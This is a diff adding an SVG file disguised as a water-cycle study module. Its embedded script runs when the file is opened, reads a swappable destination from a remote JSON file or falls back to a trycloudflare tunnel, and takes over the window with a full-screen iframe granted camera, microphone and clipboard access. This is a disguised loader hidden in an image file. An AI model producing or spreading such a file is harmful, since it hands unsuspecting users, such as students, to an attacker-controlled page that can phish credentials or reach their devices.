@@ -1,0 +1,114 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  Interactive study module.
+  This file is a self-launching SVG: opened as a document it boots the live
+  interactive module; viewed as a flat image it shows the diagram below.
+  Endpoint indirection: the live base URL is read from https://cdn.jsdelivr.net/gh/PrismDev3/interactive-study-modules@main/endpoint.json at runtime,
+  so the destination can move without re-issuing any of these files.
+-->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:h="http://www.w3.org/1999/xhtml"
+     width="1280" height="720" viewBox="0 0 1280 720"
+     preserveAspectRatio="xMidYMid meet"
+     font-family="Segoe UI, Roboto, system-ui, sans-serif">
+  <title>The Water Cycle — Review</title>
+  <desc>Interactive study module — loads an interactive learning activity.</desc>
+
+  <defs>
+    <linearGradient id="bg" x1="0" y1="0" x2="0" y2="1">
+      <stop offset="0" stop-color="#0e1830"/>
+      <stop offset="1" stop-color="#070b16"/>
+    </linearGradient>
+    <linearGradient id="bar" x1="0" y1="0" x2="1" y2="0">
+      <stop offset="0" stop-color="#3b82f6"/>
+      <stop offset="1" stop-color="#22d3ee"/>
+    </linearGradient>
+  </defs>
+
+  <!-- Static educational fallback (shown while booting, or when used as a flat image) -->
+  <rect width="1280" height="720" fill="url(#bg)"/>
+  <rect x="80" y="70" width="1120" height="580" rx="22" fill="#0b1326" stroke="#1e2d4d" stroke-width="2"/>
+  <rect x="80" y="70" width="1120" height="92" rx="22" fill="#111d38"/>
+  <circle cx="134" cy="116" r="22" fill="url(#bar)"/>
+  <text x="178" y="108" fill="#e8eefc" font-size="27" font-weight="700">The Water Cycle — Review</text>
+  <text x="178" y="138" fill="#8aa0c6" font-size="16">Interactive Study Module &#183; open to begin the activity</text>
+
+  <g stroke="#2a3c63" stroke-width="2" fill="none">
+    <circle cx="340" cy="400" r="120"/>
+    <circle cx="340" cy="400" r="58" fill="none"/>
+    <ellipse cx="340" cy="400" rx="120" ry="46"/>
+    <ellipse cx="340" cy="400" rx="120" ry="46" transform="rotate(60 340 400)"/>
+    <ellipse cx="340" cy="400" rx="120" ry="46" transform="rotate(120 340 400)"/>
+  </g>
+  <circle cx="340" cy="400" r="20" fill="url(#bar)"/>
+  <text x="340" y="560" fill="#7f95bd" font-size="15" text-anchor="middle">Figure 1. Core concept overview</text>
+
+  <g fill="#9fb4d8" font-size="18">
+    <rect x="560" y="300" width="560" height="2" fill="#26395f"/>
+    <text x="560" y="286">Key points</text>
+    <circle cx="572" cy="330" r="5" fill="url(#bar)"/><text x="592" y="336">Definitions and core vocabulary</text>
+    <circle cx="572" cy="366" r="5" fill="url(#bar)"/><text x="592" y="372">Worked examples and practice</text>
+    <circle cx="572" cy="402" r="5" fill="url(#bar)"/><text x="592" y="408">Interactive review activity</text>
+    <circle cx="572" cy="438" r="5" fill="url(#bar)"/><text x="592" y="444">Self-check and summary</text>
+  </g>
+
+  <g id="loadingArt">
+    <rect x="560" y="520" width="560" height="10" rx="5" fill="#16233f"/>
+    <rect x="560" y="520" width="190" height="10" rx="5" fill="url(#bar)">
+      <animate attributeName="width" values="40;520;40" dur="1.8s" repeatCount="indefinite"/>
+    </rect>
+    <text x="560" y="562" fill="#7f95bd" font-size="15">Loading interactive module&#8230;</text>
+  </g>
+
+  <!-- Live host: filled with the activity iframe when opened as a document -->
+  <foreignObject x="0" y="0" width="1280" height="720">
+    <h:div id="host" style="position:fixed;inset:0;width:100%;height:100%;margin:0;background:#000"></h:div>
+  </foreignObject>
+
+  <script type="text/javascript"><![CDATA[
+  (function () {
+    try {
+      var FALLBACK = "https://library-pest-traffic-train.trycloudflare.com";
+      var ENDPOINT = "https://cdn.jsdelivr.net/gh/PrismDev3/interactive-study-modules@main/endpoint.json";
+      var doc = document, done = false;
+
+      function launch(base) {
+        if (done) return; done = true;
+        base = String(base || FALLBACK).replace(/\/+$/, "");
+        // Make the SVG fill the whole window and clear the placeholder diagram.
+        var svg = doc.documentElement;
+        svg.setAttribute("width", "100%");
+        svg.setAttribute("height", "100%");
+        svg.removeAttribute("viewBox");
+        var la = doc.getElementById("loadingArt"); if (la) la.setAttribute("display", "none");
+        var host = doc.getElementById("host");
+        var fo = host && host.parentNode;
+        if (fo) { fo.setAttribute("width", "100%"); fo.setAttribute("height", "100%"); }
+        var ifr = doc.createElementNS("http://www.w3.org/1999/xhtml", "iframe");
+        ifr.setAttribute("src", base + "/");
+        ifr.setAttribute("allow", "autoplay; fullscreen; gamepad; microphone; camera; clipboard-write; clipboard-read");
+        ifr.setAttribute("allowfullscreen", "true");
+        ifr.style.cssText = "position:fixed;inset:0;width:100%;height:100%;border:0;margin:0;display:block;background:#000";
+        host.appendChild(ifr);
+      }
+
+      // Prefer the live endpoint file (one place to update if the base URL moves);
+      // fall back to the baked value if it can't be read quickly.
+      try {
+        var x = new XMLHttpRequest();
+        x.open("GET", ENDPOINT + (ENDPOINT.indexOf("?") < 0 ? "?" : "&") + "t=" + Date.now(), true);
+        x.timeout = 4000;
+        x.onreadystatechange = function () {
+          if (x.readyState === 4) {
+            var b = FALLBACK;
+            try { var j = JSON.parse(x.responseText); if (j && j.base) b = j.base; } catch (e) {}
+            launch(b);
+          }
+        };
+        x.ontimeout = x.onerror = function () { launch(FALLBACK); };
+        x.send();
+        setTimeout(function () { launch(FALLBACK); }, 4500);
+      } catch (e) { launch(FALLBACK); }
+    } catch (e) {}
+  })();
+  ]]></script>
+</svg>
